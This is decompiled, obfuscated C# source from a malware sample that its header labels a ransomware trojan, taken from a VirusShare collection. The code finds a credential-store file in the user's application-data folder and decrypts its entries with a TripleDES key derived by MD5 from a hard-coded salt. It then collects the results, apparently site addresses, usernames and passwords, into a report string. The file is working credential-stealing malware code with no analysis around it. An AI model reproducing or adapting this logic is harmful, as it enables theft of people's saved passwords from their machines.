// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLS, Version=2.24.9.7, Culture=neutral, PublicKeyToken=null
// MVID: 5D6D71DE-8D40-4460-ABF9-23365541871A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eaa908bb12fef0827442be70b4421db585c6c2d8b0ee62f8245856740ea6a776.exe

using \u0003\u000E;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0003\u000E
{
  internal sealed class \u0019\u000E
  {
    public static string \u0001;

    public class \u0088\u0004
    {
      private static byte[] \u0001;
      private static byte[] \u0002;
      private static string \u0003;
      public string \u0004;
      private int \u0005;
      private int \u0006;
      private int \u0007;
      private bool \u0008;
      private string \u000E;
      private string \u000F;
      private string \u0010;
      private string[] \u0011;
      private string[] \u0012;
      private string[] \u0013;
      private int \u0014;
      private bool \u0015;
      private string[] \u0016;
      private string[] \u0017;

      static \u0088\u0004()
      {
        int length = 11;
        byte[] numArray1;
        if (length != 0)
        {
          byte[] numArray2 = new byte[length];
          if (true)
            goto label_9;
label_2:
          numArray1[0] = (byte) 131;
          if (true)
          {
            numArray1[1] = (byte) 125;
            numArray1[2] = (byte) 252;
            numArray1[3] = (byte) 15;
            numArray1[4] = (byte) 142;
            numArray1[5] = (byte) 179;
            numArray1[6] = (byte) 232;
            numArray1[7] = (byte) 105;
            numArray1[8] = (byte) 115;
            numArray1[9] = (byte) 175;
          }
          numArray1[10] = byte.MaxValue;
          \u0019\u000E.\u0088\u0004.\u0001 = numArray1;
          length = 4;
          goto label_5;
label_9:
          numArray1 = numArray2;
          goto label_2;
        }
label_5:
        byte[] numArray3 = new byte[length];
        if (true)
          goto label_10;
label_6:
        numArray1[0] = (byte) 0;
        numArray1[1] = (byte) 0;
        do
        {
          numArray1[2] = (byte) 0;
          numArray1[3] = (byte) 8;
        }
        while (false);
        \u0019\u000E.\u0088\u0004.\u0002 = numArray1;
        \u0019\u000E.\u0088\u0004.\u0003 = global::\u000E.\u001D(Environment.SpecialFolder.ApplicationData);
        return;
label_10:
        numArray1 = numArray3;
        goto label_6;
      }

      public \u0088\u0004()
      {
        this.\u0005 = 0;
        this.\u0006 = 0;
        this.\u0007 = 0;
        this.\u0008 = true;
        this.\u0011 = new string[1001];
        this.\u0012 = new string[1001];
        this.\u0013 = new string[1001];
        this.\u0014 = 0;
        this.\u0015 = false;
        this.\u0017 = new string[3001];
      }

      public object \u0083\u0004()
      {
        List<string> stringList1 = new List<string>();
        if (true)
          goto label_28;
label_1:
        string[] strArray1 = (string[]) this.\u0084\u0004();
        if (true)
          goto label_29;
label_2:
        string[] strArray2;
        List<string> stringList2;
        try
        {
          string[] strArray3 = strArray2;
          if (true)
            goto label_12;
label_3:
          if (true)
            goto label_13;
label_8:
          string[] strArray4;
          int index;
          while (true)
          {
            int num1 = index;
            int num2 = strArray4.Length;
            int num3;
            while (true)
            {
              num3 = num2;
              if (false)
                num2 = num3;
              else
                break;
            }
            if (num1 < num3)
            {
              string str1 = strArray4[index];
              if (true)
                goto label_14;
label_5:
              string str2;
              if (\u0011.\u007F(str2, \u0008.\u0007(756), false) != 0)
              {
                List<string> stringList3 = stringList2;
                string str3 = str2;
                if (true)
                  stringList3.Add(str3);
              }
              ++index;
              continue;
label_14:
              str2 = str1;
              goto label_5;
            }
            else
              goto label_17;
          }
label_13:
          index = 0;
          goto label_8;
label_12:
          strArray4 = strArray3;
          goto label_3;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0014.\u0082();
        }
label_17:
        StringBuilder stringBuilder1 = new StringBuilder();
        try
        {
          int num;
          int index;
          if (stringList2.Count == 0)
          {
            string[] strArray5 = new string[5]
            {
              \u0007\u000E.\u0006\u000E(\u0008.\u0007(4860), \u0008.\u0007(217)),
              \u0008.\u0007(848),
              \u0007\u000E.\u0006\u000E(\u0008.\u0007(4921), \u0008.\u0007(217)),
              null,
              null
            };
            if (true)
            {
              strArray5[3] = \u0008.\u0007(848);
              strArray5[4] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(5067), \u0008.\u0007(217));
              string str = \u0012.\u0080(strArray5);
              goto label_27;
            }
          }
          else
          {
            num = stringList2.Count - 1;
            index = 0;
            goto label_24;
          }
label_23:
          index += 3;
label_24:
          if (index <= num)
          {
            StringBuilder stringBuilder2 = \u008A\u0002.\u007E\u008F\u0003((object) \u0089\u0002.\u007E\u008E\u0003((object) stringBuilder1, \u000F.\u001E(\u0007\u000E.\u0006\u000E(\u0008.\u0007(5128), \u0008.\u0007(217)), \u0097.\u007E\u008B\u0002((object) stringList2[index], 1))));
            StringBuilder stringBuilder3 = \u008A\u0002.\u007E\u008F\u0003((object) \u0089\u0002.\u007E\u008E\u0003((object) stringBuilder1, \u000F.\u001E(\u0007\u000E.\u0006\u000E(\u0008.\u0007(5145), \u0008.\u0007(217)), \u0097.\u007E\u008B\u0002((object) stringList2[index + 1], 1))));
            StringBuilder stringBuilder4 = \u008A\u0002.\u007E\u008F\u0003((object) \u0089\u0002.\u007E\u008E\u0003((object) stringBuilder1, \u000F.\u001E(\u0007\u000E.\u0006\u000E(\u0008.\u0007(5170), \u0008.\u0007(217)), \u0097.\u007E\u008B\u0002((object) stringList2[index + 2], 1))));
            StringBuilder stringBuilder5 = \u008A\u0002.\u007E\u008F\u0003((object) \u0089\u0002.\u007E\u008E\u0003((object) stringBuilder1, \u0007\u000E.\u0006\u000E(\u0008.\u0007(5195), \u0008.\u0007(217))));
            goto label_23;
          }
          else
          {
            string[] strArray6 = new string[5]
            {
              \u0007\u000E.\u0006\u000E(\u0008.\u0007(4860), \u0008.\u0007(217)),
              \u0008.\u0007(848),
              \u0008.\u007E\u0016((object) stringBuilder1),
              \u0008.\u0007(848),
              \u0007\u000E.\u0006\u000E(\u0008.\u0007(5067), \u0008.\u0007(217))
            };
            \u0019\u000E.\u0001 = \u0012.\u0080(strArray6);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0014.\u0082();
        }
label_27:
        object obj;
        return obj;
label_29:
        strArray2 = strArray1;
        goto label_2;
label_28:
        stringList2 = stringList1;
        goto label_1;
      }

      public object \u0084\u0004()
      {
        try
        {
          if (\u0084.\u0013\u0002(\u000F.\u001E(\u0019\u000E.\u0088\u0004.\u0003, \u0007\u000E.\u0006\u000E(\u0008.\u0007(5256), \u0008.\u0007(217)))))
          {
            \u0019\u000E.\u0088\u0004.\u0003 = \u000F.\u001E(\u0019\u000E.\u0088\u0004.\u0003, \u0007\u000E.\u0006\u000E(\u0008.\u0007(5301), \u0008.\u0007(217)));
            if (true)
              this.\u0086\u0004();
          }
          else if (\u0084.\u0013\u0002(\u000F.\u001E(\u0019\u000E.\u0088\u0004.\u0003, \u0007\u000E.\u0006\u000E(\u0008.\u0007(5346), \u0008.\u0007(217)))))
          {
            \u0019\u000E.\u0088\u0004.\u0003 = \u000F.\u001E(\u0019\u000E.\u0088\u0004.\u0003, \u0007\u000E.\u0006\u000E(\u0008.\u0007(5403), \u0008.\u0007(217)));
            if (true)
              this.\u0086\u0004();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          do
          {
            \u0014.\u0082();
          }
          while (false);
        }
        return (object) this.\u0017;
      }

      private void \u0086\u0004()
      {
        try
        {
          byte[] numArray1 = \u001E.\u0099(\u0019\u000E.\u0088\u0004.\u0003);
          if (true)
            goto label_70;
label_1:
          if (true)
            goto label_71;
label_2:
          byte[] numArray2;
          int num1 = numArray2.Length - 5;
          if (true)
            goto label_72;
label_3:
          if (true)
            goto label_73;
label_11:
          int index1;
          int num2;
          int num3;
          for (; index1 <= num3; ++index1)
          {
            if (numArray2[index1] == (byte) 0 && numArray2[index1 + 1] == (byte) 0 && numArray2[index1 + 2] == (byte) 0 && numArray2[index1 + 3] == (byte) 8)
            {
              int num4 = (int) numArray2[index1 + 15];
              if (true)
                goto label_74;
label_6:
              byte[] numArray3 = new byte[8];
              if (true)
                goto label_75;
label_7:
              byte[] numArray4 = new byte[num2 - 1 + 1];
              byte[] numArray5;
              if (true)
              {
                \u008B\u0002.\u0090\u0003((Array) numArray2, index1 + 4, (Array) numArray5, 0, numArray5.Length);
                \u008B\u0002.\u0090\u0003((Array) numArray2, index1 + 16, (Array) numArray4, 0, numArray4.Length);
              }
              this.\u0004 = \u0019.\u008B(\u0017\u0002.\u0013\u0003((object) this.\u0004, \u0017\u0002.\u0012\u0003(this.\u0087\u0004(numArray5, numArray4), (object) \u0008.\u0007(848))));
              index1 += 11 + num2;
              continue;
label_75:
              numArray5 = numArray3;
              goto label_7;
label_74:
              num2 = num4;
              goto label_6;
            }
          }
          this.\u0016 = \u0098.\u007E\u008D\u0002((object) this.\u0004, new char[1]
          {
            \u008D\u0002.\u0095\u0003(\u008C\u0002.\u0091\u0003())
          });
          int index2 = 0;
          do
          {
            this.\u0016[index2] = (string) null;
            ++index2;
          }
          while (index2 <= 3);
          int num5 = this.\u0016.Length - 1;
          for (int index3 = 0; index3 <= num5; ++index3)
          {
            this.\u000E = (string) null;
            this.\u000F = (string) null;
            this.\u0010 = (string) null;
            this.\u0005 = 0;
            if (\u0082.\u007E\u009E((object) this.\u0016[index3], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5460), \u0008.\u0007(217))) || \u0082.\u007E\u009E((object) this.\u0016[index3], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5477), \u0008.\u0007(217))) || \u0082.\u007E\u009E((object) this.\u0016[index3], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5494), \u0008.\u0007(217))))
            {
              if (index3 != 0)
              {
                int num6 = \u0007.\u007E\u000E((object) this.\u0016[index3]) - 1;
                for (int index4 = 0; index4 <= num6; ++index4)
                {
                  if (\u008E\u0002.\u007E\u0096\u0003((object) this.\u0016[index3], index4 - this.\u0005) > '\u007F')
                  {
                    this.\u0016[index3] = \u008A.\u007E\u001B\u0002((object) this.\u0016[index3], index4 - this.\u0005, 1);
                    ++this.\u0005;
                  }
                }
                if (index3 - this.\u0014 == 1)
                {
                  this.\u000E = this.\u0016[index3];
                  goto label_26;
                }
              }
              else
                goto label_56;
            }
            else
              goto label_29;
label_24:
            if (index3 - this.\u0014 == 2)
              this.\u000E = this.\u0016[index3];
label_26:
            if (\u0082.\u007E\u009E((object) this.\u0016[index3], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5494), \u0008.\u0007(217))))
              this.\u000E = this.\u0016[index3];
            this.\u0014 = index3;
            goto label_56;
label_29:
            int num7;
            int num8;
            if (this.\u0015)
            {
              int num9 = index3 - this.\u0014;
              int num10 = 1;
              if (num10 != 0)
              {
                if (num9 == num10 || index3 - this.\u0014 == 2)
                {
                  int num11 = \u0007.\u007E\u000E((object) this.\u0016[index3]) - 1;
                  for (int index5 = 0; index5 <= num11; ++index5)
                  {
                    if (\u008E\u0002.\u007E\u0096\u0003((object) this.\u0016[index3], index5 - this.\u0005) > '\u007F')
                    {
                      this.\u0016[index3] = \u008A.\u007E\u001B\u0002((object) this.\u0016[index3], index5 - this.\u0005, 1);
                      ++this.\u0005;
                    }
                  }
                  if (index3 - this.\u0014 == 1)
                  {
                    this.\u000F = this.\u0016[index3];
                    if (false)
                      goto label_24;
                  }
                  else if (index3 - this.\u0014 == 2)
                  {
                    this.\u0010 = this.\u0016[index3];
                    ++this.\u0006;
                    this.\u0015 = false;
                  }
                }
              }
              else
              {
                num8 = num10;
                num7 = num9;
                goto label_57;
              }
            }
            else if (this.\u0014 != 0)
            {
              int num12;
              int num13;
              int num14;
              if (index3 != this.\u0014 + 2)
              {
                int num15 = index3;
                int num16 = this.\u0014;
                int num17 = 4;
                if (num17 != 0)
                {
                  int num18 = num16 + num17;
                  if (num15 != num18)
                    goto label_56;
                }
                else
                {
                  num14 = num17;
                  num13 = num16;
                  num12 = num15;
                  goto label_46;
                }
              }
              num12 = 0;
              num13 = \u0007.\u007E\u000E((object) this.\u0016[index3]);
              num14 = 1;
label_46:
              int num19 = num13 - num14;
              for (int index6 = num12; index6 <= num19; ++index6)
              {
                if (\u008E\u0002.\u007E\u0096\u0003((object) this.\u0016[index3], index6 - this.\u0005) > '\u007F')
                {
                  this.\u0016[index3] = \u008A.\u007E\u001B\u0002((object) this.\u0016[index3], index6 - this.\u0005, 1);
                  ++this.\u0005;
                }
              }
              if (index3 == this.\u0014 + 2)
                this.\u000F = this.\u0016[index3];
              else if (index3 == this.\u0014 + 4)
              {
                this.\u0010 = this.\u0016[index3];
                if (true)
                  ++this.\u0006;
                else
                  goto label_11;
              }
            }
label_56:
            num7 = \u0011.\u007F(this.\u000E, (string) null, false);
            num8 = 0;
label_57:
            if (num7 != num8)
              this.\u0011[this.\u0006] = this.\u000E;
            if (\u0011.\u007F(this.\u000F, (string) null, false) != 0)
              this.\u0012[this.\u0006] = this.\u000F;
            if (\u0011.\u007F(this.\u0010, (string) null, false) != 0)
              this.\u0013[this.\u0006 - 1] = this.\u0010;
          }
          int num20 = this.\u0011.Length - 1;
          for (int index7 = 0; index7 <= num20 && \u0011.\u007F(this.\u0011[index7], \u0008.\u0007(756), false) != 0; ++index7)
          {
            this.\u0017[this.\u0007] = this.\u0011[index7];
            this.\u0017[this.\u0007 + 1] = this.\u0012[index7];
            this.\u0017[this.\u0007 + 2] = this.\u0013[index7];
            this.\u0007 += 3;
          }
          return;
label_73:
          index1 = 0;
          goto label_11;
label_72:
          num3 = num1;
          goto label_3;
label_71:
          num2 = 0;
          goto label_2;
label_70:
          numArray2 = numArray1;
          goto label_1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          do
          {
            \u0014.\u0082();
          }
          while (false);
        }
      }

      public object \u0087\u0004([In] byte[] obj0, [In] byte[] obj1)
      {
        object obj2;
        try
        {
          MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
          if (true)
            goto label_11;
label_1:
          \u0083 obj3 = \u0083.\u007E\u0003\u0002;
          MD5CryptoServiceProvider cryptoServiceProvider2;
          MD5CryptoServiceProvider cryptoServiceProvider3 = cryptoServiceProvider2;
          if (true)
            goto label_12;
label_2:
          byte[] numArray1 = new byte[\u0019\u000E.\u0088\u0004.\u0001.Length + (obj0.Length - 1) + 1];
          if (true)
            goto label_13;
label_3:
          \u008F\u0002 obj4 = \u008F\u0002.\u0097\u0003;
          byte[] numArray2 = \u0019\u000E.\u0088\u0004.\u0001;
          byte[] numArray3;
          byte[] numArray4 = numArray3;
          int length1 = \u0019\u000E.\u0088\u0004.\u0001.Length;
          if (true)
            goto label_14;
label_4:
          \u008B\u0002 obj5 = \u008B\u0002.\u0090\u0003;
          byte[] numArray5 = obj0;
          byte[] numArray6 = numArray3;
          int length2 = \u0019\u000E.\u0088\u0004.\u0001.Length;
          int length3 = obj0.Length;
          if (true)
            goto label_15;
label_5:
          byte[] numArray7 = \u0090\u0002.\u007E\u0098\u0003((object) cryptoServiceProvider2, numArray3);
          if (true)
            goto label_16;
label_6:
          byte[] numArray8;
          int length4 = numArray8.Length + \u0019\u000E.\u0088\u0004.\u0001.Length + (obj0.Length - 1) + 1;
          byte[] numArray9;
          TripleDESCryptoServiceProvider cryptoServiceProvider4;
          int length5;
          while (true)
          {
            byte[] numArray10 = new byte[length4];
            \u008F\u0002.\u0097\u0003((Array) numArray8, (Array) numArray10, numArray8.Length);
            \u008B\u0002.\u0090\u0003((Array) \u0019\u000E.\u0088\u0004.\u0001, 0, (Array) numArray10, numArray8.Length, \u0019\u000E.\u0088\u0004.\u0001.Length);
            \u008B\u0002.\u0090\u0003((Array) obj0, 0, (Array) numArray10, numArray8.Length + \u0019\u000E.\u0088\u0004.\u0001.Length, obj0.Length);
            numArray9 = \u0090\u0002.\u007E\u0098\u0003((object) cryptoServiceProvider2, numArray10);
            cryptoServiceProvider4 = new TripleDESCryptoServiceProvider();
            \u0091\u0002.\u007E\u0099\u0003((object) cryptoServiceProvider4, CipherMode.CBC);
            \u0092\u0002.\u007E\u009A\u0003((object) cryptoServiceProvider4, PaddingMode.None);
            length5 = 24;
            if (length5 == 0)
              length4 = length5;
            else
              break;
          }
          byte[] numArray11 = new byte[length5];
          ICryptoTransform cryptoTransform;
          if (true)
          {
            byte[] numArray12 = new byte[8];
            \u008F\u0002.\u0097\u0003((Array) numArray8, (Array) numArray11, numArray8.Length);
            \u008B\u0002.\u0090\u0003((Array) numArray9, 0, (Array) numArray11, numArray8.Length, 8);
            \u008B\u0002.\u0090\u0003((Array) numArray9, 8, (Array) numArray12, 0, 8);
            obj0 = numArray11;
            \u0093\u0002.\u007E\u009B\u0003((object) cryptoServiceProvider4, numArray12);
            cryptoTransform = \u0094\u0002.\u007E\u009C\u0003((object) cryptoServiceProvider4);
          }
          byte[] numArray13 = \u0095\u0002.\u007E\u009D\u0003((object) cryptoTransform, obj1, 0, obj1.Length);
          obj2 = (object) \u007F.\u007E\u009B((object) \u001D.\u0095(), numArray13);
          goto label_18;
label_16:
          numArray8 = numArray7;
          goto label_6;
label_15:
          obj5((Array) numArray5, 0, (Array) numArray6, length2, length3);
          goto label_5;
label_14:
          obj4((Array) numArray2, (Array) numArray4, length1);
          goto label_4;
label_13:
          numArray3 = numArray1;
          goto label_3;
label_12:
          obj3((object) cryptoServiceProvider3);
          goto label_2;
label_11:
          cryptoServiceProvider2 = cryptoServiceProvider1;
          goto label_1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          obj2 = (object) \u0008.\u0007(756);
          \u0014.\u0082();
        }
label_18:
        return obj2;
      }
    }
  }
}
